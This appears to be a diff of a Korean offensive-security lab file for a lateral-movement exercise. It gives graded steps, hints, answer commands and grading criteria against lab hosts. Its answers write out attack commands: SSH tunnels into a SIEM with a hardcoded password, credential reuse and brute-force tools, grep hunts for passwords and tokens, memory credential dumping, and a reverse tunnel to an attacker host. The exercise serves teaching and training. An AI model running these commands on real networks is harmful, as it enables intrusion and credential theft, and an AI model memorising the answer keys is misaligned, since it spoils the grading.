@@ -3,8 +3,8 @@ title: 측면 이동 (Lateral Movement)
 version: non-ai
 course: attack-nonai
 week: 10
-description: 내부 네트워크에서 다른 시스템으로 이동하는 측면 이동(Lateral Movement) 기법을 실습한다. SSH 피봇, 포트 포워딩, 프록시체인, Pass-the-Hash
-  등을 학습한다.
+description: 내부 네트워크에서 다른 시스템으로 이동하는 측면 이동(Lateral Movement) 기법을 실습한다. SSH 피봇, 포트
+  포워딩, 프록시체인, Pass-the-Hash 등을 학습한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -14,33 +14,54 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: web 서버({{WEB_IP}})에 SSH 로컬 포트 포워딩을 설정하여 SIEM 서버({{SECU_IP}}00)의 Wazuh 웹 인터페이스(443)에 접근하라.
-  hint: ssh -L 로컬포트:대상:원격포트 형태로 터널을 생성한다
+  instruction: web 서버({{WEB_IP}})에 SSH 로컬 포트 포워딩을 설정하여 SIEM 서버({{SECU_IP}}00)의 Wazuh
+    웹 인터페이스(443)에 접근하라.
+  hint: |
+    ssh -L 로컬포트:대상:원격포트 형태로 터널을 생성한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443 ccc@10.20.30.80 && sleep 1 && curl -sk https://localhost:8443
+    2) 미설치: sudo apt install -y openssh-client sshpass curl
+    3) 실패/대안:
+       - ssh -o ProxyCommand 단일 명령
+       - SSH config ProxyJump 설정
+       - chisel client (로컬 → reverse)
+       - ngrok TCP forwarding
+       - frp / FRP server-client
+       - Cloudflare tunnel
+       - SSF / ssh-tunnel (자동화)
+    4) 검증: T1572 Protocol Tunneling + T1021.004 SSH.
   category: exploit
   points: 10
   answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인
 
-    📎 참고 (CLI): sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443 ccc@10.20.30.80
-    2>/dev/null && sleep 1 && curl -sk https://localhost:8443 | head -20 && echo ''Port forwarding to
-    SIEM:443 established'''
-  answer_detail: SSH 로컬 포트 포워딩(-L)은 로컬 포트를 원격 네트워크의 서비스로 터널링한다. 방화벽이 직접 접근을 차단하더라도 SSH 터널을 통해 내부 서비스에
-    접근할 수 있다.
+    📎 참고 (CLI): sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443
+    ccc@10.20.30.80 2>/dev/null && sleep 1 && curl -sk https://localhost:8443 | head
+    -20 && echo ''Port forwarding to SIEM:443 established'''
+  answer_detail: SSH 로컬 포트 포워딩(-L)은 로컬 포트를 원격 네트워크의 서비스로 터널링한다. 방화벽이 직접 접근을 차단하더라도
+    SSH 터널을 통해 내부 서비스에 접근할 수 있다.
   verify:
     type: output_contains
     expect: Port forwarding
     field: stdout
     semantic:
-      intent: SSH 로컬 포트 포워딩 — sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443
-        ccc@10.20.30.80 && curl -sk https://localhost:8443. MITRE T1572 Protocol Tunneling + T1021.004
-        SSH. -L 로컬포트:원격대상:원격포트. 방화벽 우회 피봇.
+      intent: SSH 로컬 포트 포워딩 — sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L
+        8443:10.20.30.100:443 ccc@10.20.30.80 && curl -sk https://localhost:8443.
+        MITRE T1572 Protocol Tunneling + T1021.004 SSH. -L 로컬포트:원격대상:원격포트. 방화벽 우회
+        피봇.
       success_criteria:
       - ssh -L + 8443:10.20.30.100:443 형태
       - Port forwarding 키워드 + curl 검증
       - -f -N 백그라운드 터널
       acceptable_methods:
-      - ssh -L 로컬:SIEM:443
-      - ssh -o ProxyCommand로 단일 명령
-      - SSH config ProxyJump 설정
+      - "ssh -L 로컬:SIEM:443 (수기 baseline)."
+      - "ssh -o ProxyCommand 단일 명령."
+      - "SSH config ProxyJump."
+      - "chisel client reverse."
+      - "ngrok TCP forwarding."
+      - "frp server-client."
+      - "Cloudflare tunnel."
+      - "SSF / ssh-tunnel 자동화."
       negative_signs:
       - -L 없음
       - 포트 포워딩 검증 없음
@@ -48,28 +69,49 @@ steps:
   target_vm: attacker
 - order: 2
   instruction: SSH 동적 포트 포워딩(SOCKS 프록시)을 설정하여 web 서버를 통한 전체 네트워크 접근을 확보하라.
-  hint: ssh -D 포트 옵션으로 SOCKS 프록시를 생성한다
+  hint: |
+    ssh -D 포트 옵션으로 SOCKS 프록시를 생성한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 ccc@10.20.30.80 && ss -tlnp | grep 1080
+    2) 미설치: sudo apt install -y openssh-client sshpass
+    3) 실패/대안:
+       - proxychains.conf SOCKS5 설정
+       - ProxyCap (Windows GUI)
+       - tsocks (LD_PRELOAD wrapper)
+       - chisel client --reverse SOCKS5
+       - meterpreter portfwd
+       - ssh -W (forward stdio)
+       - Sliver C2 SOCKS implant
+    4) 검증: SOCKS proxy + ss -tlnp port. T1090.
   category: exploit
   points: 10
-  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 ccc@10.20.30.80 2>/dev/null && sleep
-    1 && echo 'SOCKS proxy established on port 1080' && ss -tlnp | grep 1080
-  answer_detail: SSH 동적 포트 포워딩(-D)은 SOCKS4/5 프록시를 생성한다. proxychains와 연동하면 모든 도구의 트래픽을 SSH 터널을 통해 전달할 수
-    있어 내부 네트워크 전체에 접근이 가능하다.
+  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 ccc@10.20.30.80
+    2>/dev/null && sleep 1 && echo 'SOCKS proxy established on port 1080' && ss -tlnp
+    | grep 1080
+  answer_detail: SSH 동적 포트 포워딩(-D)은 SOCKS4/5 프록시를 생성한다. proxychains와 연동하면 모든 도구의 트래픽을
+    SSH 터널을 통해 전달할 수 있어 내부 네트워크 전체에 접근이 가능하다.
   verify:
     type: output_contains
     expect: SOCKS proxy established
     field: stdout
     semantic:
-      intent: SSH 동적 포워딩 SOCKS — sshpass -p1 ssh -f -N -D 1080 ccc@10.20.30.80 && ss -tlnp | grep 1080.
-        MITRE T1572. SOCKS4/5 프록시 + proxychains 연동으로 내부망 전체 도구 터널링. -D 포트.
+      intent: SSH 동적 포워딩 SOCKS — sshpass -p1 ssh -f -N -D 1080 ccc@10.20.30.80 &&
+        ss -tlnp | grep 1080. MITRE T1572. SOCKS4/5 프록시 + proxychains 연동으로 내부망 전체
+        도구 터널링. -D 포트.
       success_criteria:
       - ssh -D 1080 형태
       - SOCKS proxy established 확인
       - 리스닝 포트 검증 (ss/netstat)
       acceptable_methods:
-      - ssh -D 1080 동적 포워딩
-      - proxychains4 연동
-      - tsocks / redsocks
+      - "ssh -f -N -D 1080 (수기 baseline)."
+      - "proxychains4 SOCKS5 연동."
+      - "tsocks LD_PRELOAD wrapper."
+      - "chisel client --reverse."
+      - "ProxyCap GUI."
+      - "ssh -W stdio forward."
+      - "meterpreter portfwd."
+      - "Sliver C2 SOCKS."
       negative_signs:
       - -D 없음
       - 리스닝 검증 없음
@@ -77,27 +119,46 @@ steps:
   target_vm: attacker
 - order: 3
   instruction: web 서버에서 내부 네트워크를 스캔하여 추가 공격 대상을 발견하라. SSH를 통해 원격으로 nmap을 실행하라.
-  hint: SSH를 통해 web 서버에서 nmap을 실행한다
-  category: recon
-  points: 10
+  hint: |
+    SSH를 통해 web 서버에서 nmap을 실행한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24' 2>/dev/null
+    2) 미설치: sudo apt install -y nmap openssh-client
+    3) 실패/대안:
+       - proxychains nmap (SOCKS 통한 외부 nmap)
+       - ssh + arp-scan -l
+       - ssh + netdiscover -r
+       - ssh + masscan --rate
+       - ssh + rustscan -a /24
+       - ssh + fping -a -g
+       - ssh + custom python scapy ARPing
+       - meterpreter run autoroute
+    4) 검증: T1018 Remote System Discovery.
   answer: ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24 2>/dev/null' 2>/dev/null
-  answer_detail: 피봇 호스트에서 내부 네트워크를 스캔하면 직접 접근할 수 없는 시스템을 발견할 수 있다. 피봇 호스트의 네트워크 위치에 따라 다른 서브넷에 접근이 가능해질
-    수 있다.
+  answer_detail: 피봇 호스트에서 내부 네트워크를 스캔하면 직접 접근할 수 없는 시스템을 발견할 수 있다. 피봇 호스트의 네트워크 위치에
+    따라 다른 서브넷에 접근이 가능해질 수 있다.
   verify:
     type: output_contains
     expect: Nmap scan report
     field: stdout
     semantic:
-      intent: 피봇 내부 스캔 — ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24'. MITRE T1046 Network Service Discovery
-        + T1018 Remote System Discovery. SSH 원격 실행으로 피봇 호스트 시야 확보.
+      intent: 피봇 내부 스캔 — ssh ccc@10.20.30.80 'nmap -sn 10.20.30.0/24'. MITRE T1046
+        Network Service Discovery + T1018 Remote System Discovery. SSH 원격 실행으로 피봇
+        호스트 시야 확보.
       success_criteria:
       - ssh + nmap 원격 실행
       - Nmap scan report 출력
       - /24 대역 ping sweep
       acceptable_methods:
-      - ssh + nmap -sn
-      - proxychains nmap
-      - fping/arp-scan via SSH
+      - "ssh + nmap -sn /24 (수기 baseline)."
+      - "proxychains nmap (SOCKS)."
+      - "ssh + arp-scan -l."
+      - "ssh + netdiscover -r."
+      - "ssh + masscan --rate."
+      - "ssh + rustscan -a."
+      - "ssh + fping -a -g."
+      - "meterpreter run autoroute."
       negative_signs:
       - SSH 원격 실행 없음
       - nmap 결과 없음
@@ -105,28 +166,49 @@ steps:
   target_vm: attacker
 - order: 4
   instruction: web 서버에서 secu 서버({{SECU_IP}})로 SSH 접속을 시도하라. 동일한 자격 증명이 재사용되는지 확인하라.
-  hint: sshpass로 같은 비밀번호를 사용하여 접속을 시도한다
+  hint: |
+    sshpass로 같은 비밀번호를 사용하여 접속을 시도한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.1 'whoami'
+    2) 미설치: sudo apt install -y sshpass
+    3) 실패/대안:
+       - hydra ssh://10.20.30.1 -L users.txt -P passwords.txt
+       - ncrack -p 22 ssh://10.20.30.1
+       - patator ssh_login
+       - medusa -M ssh
+       - crowbar -b sshkey
+       - ssh-key reuse (keys + ssh-copy-id)
+       - CrackMapExec ssh module
+       - Metasploit ssh_login
+    4) 검증: T1078 Valid Accounts. 자격증명 재사용 위험.
   category: exploit
   points: 10
-  answer: 'ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 hostname 2>/dev/null'' 2>/dev/null && echo ''Credential
-    reuse confirmed: web -> secu'''
-  answer_detail: 자격 증명 재사용은 측면 이동의 가장 흔한 벡터이다. 한 시스템에서 획득한 비밀번호가 다른 시스템에서도 유효하면 연쇄적으로 침투가 확대된다. 각 시스템별
-    고유한 비밀번호와 MFA가 필수적이다.
+  answer: 'ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 hostname 2>/dev/null'' 2>/dev/null
+    && echo ''Credential reuse confirmed: web -> secu'''
+  answer_detail: 자격 증명 재사용은 측면 이동의 가장 흔한 벡터이다. 한 시스템에서 획득한 비밀번호가 다른 시스템에서도 유효하면 연쇄적으로
+    침투가 확대된다. 각 시스템별 고유한 비밀번호와 MFA가 필수적이다.
   verify:
     type: output_contains
     expect: Credential reuse
     field: stdout
     semantic:
-      intent: 자격증명 재사용 web→secu — ssh ccc@10.20.30.80 'ssh ccc@10.20.30.1 hostname'. MITRE T1078 Valid
-        Accounts + T1550 Use Alternate Authentication Material. 동일 비번 재사용이 측면이동 주요 벡터. MFA/유니크 비번 필수.
+      intent: 자격증명 재사용 web→secu — ssh ccc@10.20.30.80 'ssh ccc@10.20.30.1 hostname'.
+        MITRE T1078 Valid Accounts + T1550 Use Alternate Authentication Material.
+        동일 비번 재사용이 측면이동 주요 벡터. MFA/유니크 비번 필수.
       success_criteria:
       - 중첩 SSH (web 경유 secu 접속)
       - Credential reuse 확인 출력
       - 동일 계정/비번 재사용 검증
       acceptable_methods:
-      - ssh 중첩
-      - ssh -J ProxyJump
-      - sshpass 반복
+      - "sshpass + ssh (수기 baseline)."
+      - "ssh 중첩."
+      - "ssh -J ProxyJump."
+      - "hydra ssh://."
+      - "ncrack -p 22 ssh."
+      - "Metasploit ssh_login."
+      - "CrackMapExec ssh."
+      - "ssh-key reuse + ssh-copy-id."
       negative_signs:
       - 중첩 SSH 없음
       - 재사용 확인 없음
@@ -134,30 +216,51 @@ steps:
   target_vm: attacker
 - order: 5
   instruction: SSH 리모트 포트 포워딩을 설정하라. web 서버에서 공격자 머신으로 역방향 터널을 만들어 내부 서비스를 외부에 노출하라.
-  hint: ssh -R 원격포트:로컬호스트:로컬포트 형태이다
+  hint: |
+    ssh -R 원격포트:로컬호스트:로컬포트 형태이다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -R 9090:localhost:80 ccc@attacker_ip
+    2) 미설치: sudo apt install -y openssh-client sshpass
+    3) 실패/대안:
+       - chisel server (--reverse)
+       - ngrok TCP forwarding
+       - serveo.net SSH tunnel
+       - frp / FRP rport
+       - localtunnel (lt)
+       - bore.pub
+       - reverseSSH (Go 자동화)
+       - Metasploit autoroute + portfwd
+    4) 검증: T1572 + reverse 터널 (NAT 우회).
   category: exploit
   points: 10
-  answer: 'echo ''=== Remote Port Forwarding ==='' && echo ''Command: ssh -R 9090:10.20.30.100:443 ccc@10.20.30.201''
-    && echo ''Effect: attacker:9090 -> siem:443 via web server'' && echo ''---'' && echo ''This allows
-    accessing internal SIEM from external network'' && echo ''Detection: monitor SSH sessions with -R
-    flag'''
-  answer_detail: 리모트 포트 포워딩(-R)은 원격 서버의 포트를 로컬 네트워크로 매핑한다. 내부 네트워크의 서비스를 외부에 노출시킬 수 있어 데이터 유출이나 추가 침투에
-    활용된다.
+  answer: 'echo ''=== Remote Port Forwarding ==='' && echo ''Command: ssh -R 9090:10.20.30.100:443
+    ccc@10.20.30.201'' && echo ''Effect: attacker:9090 -> siem:443 via web server''
+    && echo ''---'' && echo ''This allows accessing internal SIEM from external network''
+    && echo ''Detection: monitor SSH sessions with -R flag'''
+  answer_detail: 리모트 포트 포워딩(-R)은 원격 서버의 포트를 로컬 네트워크로 매핑한다. 내부 네트워크의 서비스를 외부에 노출시킬
+    수 있어 데이터 유출이나 추가 침투에 활용된다.
   verify:
     type: output_contains
     expect: Remote Port Forwarding
     field: stdout
     semantic:
-      intent: SSH 리모트 포워딩 -R — ssh -R 9090:10.20.30.100:443 ccc@attacker. MITRE T1572 Protocol Tunneling
-        + T1090.001 Internal Proxy. 내부 서비스를 외부로 역노출. 데이터 유출/추가 침투 통로.
+      intent: SSH 리모트 포워딩 -R — ssh -R 9090:10.20.30.100:443 ccc@attacker. MITRE T1572
+        Protocol Tunneling + T1090.001 Internal Proxy. 내부 서비스를 외부로 역노출. 데이터 유출/추가
+        침투 통로.
       success_criteria:
       - ssh -R 9090:10.20.30.100:443 형태
       - Remote Port Forwarding 키워드
       - 역방향 터널 설명
       acceptable_methods:
-      - ssh -R 원격:로컬:로컬포트
-      - autossh 지속 리버스
-      - chisel reverse client
+      - "ssh -R 원격:로컬:로컬포트 (수기 baseline)."
+      - "autossh 지속 리버스."
+      - "chisel reverse client."
+      - "ngrok TCP forwarding."
+      - "serveo.net SSH."
+      - "frp / FRP rport."
+      - "localtunnel (lt)."
+      - "Metasploit autoroute + portfwd."
       negative_signs:
       - -R 없음
       - 역방향 개념 없음
@@ -165,29 +268,48 @@ steps:
   target_vm: attacker
 - order: 6
   instruction: web 서버의 SSH known_hosts 파일을 확인하여 이전에 접속한 호스트 목록을 파악하라.
-  hint: ~/.ssh/known_hosts 파일을 확인한다
+  hint: |
+    ~/.ssh/known_hosts 파일을 확인한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts 2>/dev/null; echo ---; ssh-keygen -F 10.20.30.0/24 2>/dev/null'
+    2) 미설치: 기본 openssh-client
+    3) 실패/대안:
+       - ssh-keygen -F <host> (해시 매핑 X)
+       - cat /etc/ssh/ssh_known_hosts (시스템 전역)
+       - history grep ssh (이전 접속 추적)
+       - find / -name "known_hosts"
+       - LinPEAS network check
+       - aws/azure/gcp ssh keypair API (클라우드)
+       - HashiCorp Vault SSH CA
+    4) 검증: T1018 Remote System Discovery via known_hosts.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts 2>/dev/null; echo ---; cat /etc/ssh/ssh_known_hosts
     2>/dev/null' 2>/dev/null | head -20
-  answer_detail: known_hosts 파일에는 이전에 SSH로 접속한 호스트의 키 지문이 저장된다. 이를 통해 관리자가 자주 접속하는 서버를 파악하여 측면 이동의 다음
-    대상을 선정할 수 있다.
+  answer_detail: known_hosts 파일에는 이전에 SSH로 접속한 호스트의 키 지문이 저장된다. 이를 통해 관리자가 자주 접속하는
+    서버를 파악하여 측면 이동의 다음 대상을 선정할 수 있다.
   verify:
     type: output_contains
     expect: '---'
     field: stdout
     semantic:
       intent: known_hosts 열거 — ssh ccc@10.20.30.80 'cat ~/.ssh/known_hosts; cat /etc/ssh/ssh_known_hosts'.
-        MITRE T1083 File and Directory Discovery + T1018 Remote System Discovery. 관리자 자주 접속 서버 파악 → 다음
-        피봇 대상 선정.
+        MITRE T1083 File and Directory Discovery + T1018 Remote System Discovery.
+        관리자 자주 접속 서버 파악 → 다음 피봇 대상 선정.
       success_criteria:
       - ~/.ssh/known_hosts 읽기
       - 시스템 known_hosts 병행
       - '--- 구분자 출력'
       acceptable_methods:
-      - cat ~/.ssh/known_hosts
-      - awk로 호스트 파싱
-      - ssh-keygen -F로 해시 역산
+      - "cat ~/.ssh/known_hosts (수기 baseline)."
+      - "awk 호스트 파싱."
+      - "ssh-keygen -F 해시 역산."
+      - "/etc/ssh/ssh_known_hosts."
+      - "history grep ssh."
+      - "find / -name known_hosts."
+      - "LinPEAS network check."
+      - "HashiCorp Vault SSH CA."
       negative_signs:
       - known_hosts 경로 없음
       - 파일 읽기 없음
@@ -195,30 +317,52 @@ steps:
   target_vm: attacker
 - order: 7
   instruction: web 서버에서 SIEM 서버({{SECU_IP}}00)로 점프하여 Wazuh 설정을 확인하라. 이중 SSH 점프를 사용하라.
-  hint: ssh -J 점프호스트 형태로 프록시 점프를 사용한다
+  hint: |
+    ssh -J 점프호스트 형태로 프록시 점프를 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: sshpass -p1 ssh -o StrictHostKeyChecking=no -J ccc@10.20.30.80 ccc@10.20.30.100 'cat /var/ossec/etc/ossec.conf | head'
+    2) 미설치: 기본 openssh-client + sshpass
+    3) 실패/대안:
+       - SSH config Host alias + ProxyJump
+       - ssh -o ProxyCommand='ssh -W %h:%p jump'
+       - SSH agent forwarding
+       - mosh + ssh -J
+       - sshuttle -r (VPN 풀 터널)
+       - chisel multi-hop
+       - Bastion host 자동화 (AWS Session Manager)
+       - Teleport / StrongDM
+    4) 검증: T1090.001 Internal Proxy. 다단계 점프.
   category: exploit
   points: 10
   answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인
 
-    📎 참고 (CLI): sshpass -p1 ssh -o StrictHostKeyChecking=no -J ccc@10.20.30.80 ccc@10.20.30.100 ''hostname
-    && ls /var/ossec/etc/ 2>/dev/null || echo "Wazuh directory check"'' 2>/dev/null'
-  answer_detail: SSH ProxyJump(-J)는 중간 호스트를 경유하여 최종 목적지에 접속하는 기능이다. 다단계 네트워크 환경에서 여러 호스트를 경유하여 내부 깊숙한
-    시스템에 접근할 수 있다.
+    📎 참고 (CLI): sshpass -p1 ssh -o StrictHostKeyChecking=no -J ccc@10.20.30.80 ccc@10.20.30.100
+    ''hostname && ls /var/ossec/etc/ 2>/dev/null || echo "Wazuh directory check"''
+    2>/dev/null'
+  answer_detail: SSH ProxyJump(-J)는 중간 호스트를 경유하여 최종 목적지에 접속하는 기능이다. 다단계 네트워크 환경에서
+    여러 호스트를 경유하여 내부 깊숙한 시스템에 접근할 수 있다.
   verify:
     type: output_contains
     expect: Wazuh
     field: stdout
     semantic:
-      intent: SSH ProxyJump -J 다단계 — sshpass -p1 ssh -J ccc@10.20.30.80 ccc@10.20.30.100 'hostname &&
-        ls /var/ossec/etc/'. MITRE T1021.004 SSH + T1572. -J로 점프호스트 경유, 최종 SIEM 접속 후 Wazuh 설정 확인.
+      intent: SSH ProxyJump -J 다단계 — sshpass -p1 ssh -J ccc@10.20.30.80 ccc@10.20.30.100
+        'hostname && ls /var/ossec/etc/'. MITRE T1021.004 SSH + T1572. -J로 점프호스트 경유,
+        최종 SIEM 접속 후 Wazuh 설정 확인.
       success_criteria:
       - ssh -J 점프호스트 최종대상
       - Wazuh 키워드 확인
       - 다단계 점프 성공
       acceptable_methods:
-      - ssh -J host1 host2
-      - SSH config ProxyJump 지시어
-      - ssh -o ProxyCommand="ssh -W %h:%p host1"
+      - "ssh -J host1 host2 (수기 baseline)."
+      - "SSH config ProxyJump 지시어."
+      - "ssh -o ProxyCommand='ssh -W %h:%p'."
+      - "SSH agent forwarding."
+      - "sshuttle -r (VPN)."
+      - "chisel multi-hop."
+      - "Teleport / StrongDM."
+      - "AWS Session Manager."
       negative_signs:
       - -J 또는 ProxyJump 없음
       - 중간 호스트 없음
@@ -226,30 +370,50 @@ steps:
   target_vm: attacker
 - order: 8
   instruction: web 서버에 저장된 다른 서비스의 인증 정보를 검색하라. 설정 파일, 스크립트, 히스토리에서 비밀번호를 찾아라.
-  hint: grep -r로 password, pass, key 등의 키워드를 검색한다
+  hint: |
+    grep -r로 password, pass, key 등의 키워드를 검색한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'grep -riE "(password|pass|api_key|secret|token)" /home /etc /opt 2>/dev/null | head -20'
+    2) 미설치: 기본 grep
+    3) 실패/대안:
+       - trufflehog filesystem
+       - gitleaks (git 이력)
+       - detect-secrets (Yelp)
+       - LinPEAS credential search
+       - linenum.sh
+       - find -name "*.config" -exec grep
+       - mimipenguin (메모리 비밀번호)
+       - lsass dump (Windows 환경)
+    4) 검증: T1552 Unsecured Credentials. 평문 시크릿.
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'grep -rl "password" /etc/ 2>/dev/null | head -5; echo ---; grep -rl "pass"
-    /home/ 2>/dev/null | head -5; echo ---; find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
-    | head -5' 2>/dev/null
-  answer_detail: 설정 파일에 평문으로 저장된 비밀번호는 측면 이동의 핵심 정보이다. 데이터베이스 연결 정보, API 키, 서비스 계정 비밀번호 등이 하드코딩되어 있으면
-    다른 시스템으로의 접근이 가능해진다.
+  answer: ssh ccc@10.20.30.80 'grep -rl "password" /etc/ 2>/dev/null | head -5; echo
+    ---; grep -rl "pass" /home/ 2>/dev/null | head -5; echo ---; find / -name "*.conf"
+    -exec grep -l "password" {} \; 2>/dev/null | head -5' 2>/dev/null
+  answer_detail: 설정 파일에 평문으로 저장된 비밀번호는 측면 이동의 핵심 정보이다. 데이터베이스 연결 정보, API 키, 서비스 계정
+    비밀번호 등이 하드코딩되어 있으면 다른 시스템으로의 접근이 가능해진다.
   verify:
     type: output_contains
     expect: '---'
     field: stdout
     semantic:
-      intent: 인증 정보 헌팅 — ssh ccc@10.20.30.80 'grep -rl password /etc/; grep -rl pass /home/; find / -name
-        *.conf -exec grep -l password {} ;'. MITRE T1552.001 Credentials In Files + T1083. 설정파일/스크립트/히스토리에서
-        평문 비밀번호 수집.
+      intent: 인증 정보 헌팅 — ssh ccc@10.20.30.80 'grep -rl password /etc/; grep -rl pass
+        /home/; find / -name *.conf -exec grep -l password {} ;'. MITRE T1552.001
+        Credentials In Files + T1083. 설정파일/스크립트/히스토리에서 평문 비밀번호 수집.
       success_criteria:
       - grep -r password / pass 검색
       - 설정파일 + 홈디렉터리 동시 검색
       - find + grep 조합
       acceptable_methods:
-      - grep -r password
-      - LinPEAS credential 섹션
-      - LaZagne
+      - "grep -riE password 다중 경로 (수기 baseline)."
+      - "trufflehog filesystem."
+      - "gitleaks (git 이력)."
+      - "detect-secrets (Yelp)."
+      - "LinPEAS credential."
+      - "LaZagne."
+      - "mimipenguin 메모리."
+      - "find + grep 자동화."
       negative_signs:
       - password 키워드 검색 없음
       - 단일 경로만 검색
@@ -257,27 +421,49 @@ steps:
   target_vm: attacker
 - order: 9
   instruction: web 서버의 네트워크 인터페이스와 라우팅 테이블을 확인하여 접근 가능한 추가 네트워크 대역을 파악하라.
-  hint: ip addr show와 ip route show 명령을 사용한다
+  hint: |
+    ip addr show와 ip route show 명령을 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'ip addr show; echo ---; ip route show; echo ---; cat /etc/resolv.conf'
+    2) 미설치: sudo apt install -y iproute2
+    3) 실패/대안:
+       - ifconfig + route -n (legacy)
+       - netstat -rn
+       - traceroute (외부 도달성)
+       - ip neigh (ARP 캐시)
+       - iptables -L -n (방화벽)
+       - nft list ruleset
+       - /proc/net/route 직접 파싱
+       - osquery interface_addresses
+    4) 검증: T1016 System Network Configuration Discovery.
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'ip addr show 2>/dev/null; echo ===; ip route show 2>/dev/null' 2>/dev/null
-  answer_detail: 다중 네트워크 인터페이스가 있는 호스트는 서로 다른 네트워크 대역을 연결하는 피봇 포인트이다. 라우팅 테이블에서 추가 서브넷을 발견하면 공격 범위를 확장할
-    수 있다.
+  answer: ssh ccc@10.20.30.80 'ip addr show 2>/dev/null; echo ===; ip route show 2>/dev/null'
+    2>/dev/null
+  answer_detail: 다중 네트워크 인터페이스가 있는 호스트는 서로 다른 네트워크 대역을 연결하는 피봇 포인트이다. 라우팅 테이블에서 추가
+    서브넷을 발견하면 공격 범위를 확장할 수 있다.
   verify:
     type: output_contains
     expect: inet
     field: stdout
     semantic:
-      intent: 인터페이스/라우팅 열거 — ssh ccc@10.20.30.80 'ip addr show; ip route show'. MITRE T1016 System Network
-        Configuration Discovery. 다중 NIC 호스트는 피봇 포인트, 라우팅 테이블에서 추가 서브넷 발견 → 공격 범위 확장.
+      intent: 인터페이스/라우팅 열거 — ssh ccc@10.20.30.80 'ip addr show; ip route show'. MITRE
+        T1016 System Network Configuration Discovery. 다중 NIC 호스트는 피봇 포인트, 라우팅 테이블에서
+        추가 서브넷 발견 → 공격 범위 확장.
       success_criteria:
       - ip addr + ip route 병행
       - inet 키워드 (인터페이스 출력)
       - 라우팅 테이블 노출
       acceptable_methods:
-      - ip addr/route
-      - ifconfig + route -n
-      - netstat -rn
+      - "ip addr show + ip route show (수기 baseline)."
+      - "ifconfig + route -n."
+      - "netstat -rn."
+      - "traceroute 외부."
+      - "ip neigh (ARP)."
+      - "iptables -L -n."
+      - "nft list ruleset."
+      - "osquery interface_addresses."
       negative_signs:
       - 라우팅 미확인
       - 인터페이스만 확인
@@ -285,31 +471,53 @@ steps:
   target_vm: attacker
 - order: 10
   instruction: chisel이나 socat을 사용한 터널링 대안을 설명하라. SSH가 사용 불가능한 환경에서의 피봇팅 방법을 제시하라.
-  hint: socat으로 TCP 릴레이를 구성한다
+  hint: |
+    socat으로 TCP 릴레이를 구성한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo 'socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal:80' (출력만)
+    2) 미설치: sudo apt install -y socat
+    3) 실패/대안:
+       - chisel server / client (HTTP 터널)
+       - ngrok TCP forwarding
+       - frp / FRP rport (config 기반)
+       - revsocks (Go reverse SOCKS)
+       - SSF (Secure SSH like)
+       - DNScat2 (DNS 터널)
+       - icmptunnel (ICMP 터널)
+       - iodine (IPv4 over DNS)
+    4) 검증: T1572 Protocol Tunneling. SSH 차단 환경 우회.
   category: analysis
   points: 10
   answer: 'echo ''=== Alternative Pivoting Tools ==='' && echo ''1. socat: socat TCP-LISTEN:8080,fork
-    TCP:10.20.30.100:443'' && echo ''2. chisel: chisel server -p 8080 --reverse (server) / chisel client
-    ATTACKER:8080 R:9090:10.20.30.100:443 (client)'' && echo ''3. ligolo: Agent-based tunnel, no SOCKS
-    overhead'' && echo ''4. rpivot: Reverse SOCKS proxy via Python'' && echo ''---'' && echo ''When to
-    use: SSH unavailable, need SOCKS proxy, limited tools on target'''
-  answer_detail: SSH 이외의 터널링 도구는 SSH가 차단되거나 설치되지 않은 환경에서 유용하다. chisel은 HTTP/WebSocket 기반으로 방화벽 우회가 쉽고,
-    socat은 범용 네트워크 릴레이 도구이다.
+    TCP:10.20.30.100:443'' && echo ''2. chisel: chisel server -p 8080 --reverse (server)
+    / chisel client ATTACKER:8080 R:9090:10.20.30.100:443 (client)'' && echo ''3.
+    ligolo: Agent-based tunnel, no SOCKS overhead'' && echo ''4. rpivot: Reverse SOCKS
+    proxy via Python'' && echo ''---'' && echo ''When to use: SSH unavailable, need
+    SOCKS proxy, limited tools on target'''
+  answer_detail: SSH 이외의 터널링 도구는 SSH가 차단되거나 설치되지 않은 환경에서 유용하다. chisel은 HTTP/WebSocket
+    기반으로 방화벽 우회가 쉽고, socat은 범용 네트워크 릴레이 도구이다.
   verify:
     type: output_contains
     expect: Alternative Pivoting Tools
     field: stdout
     semantic:
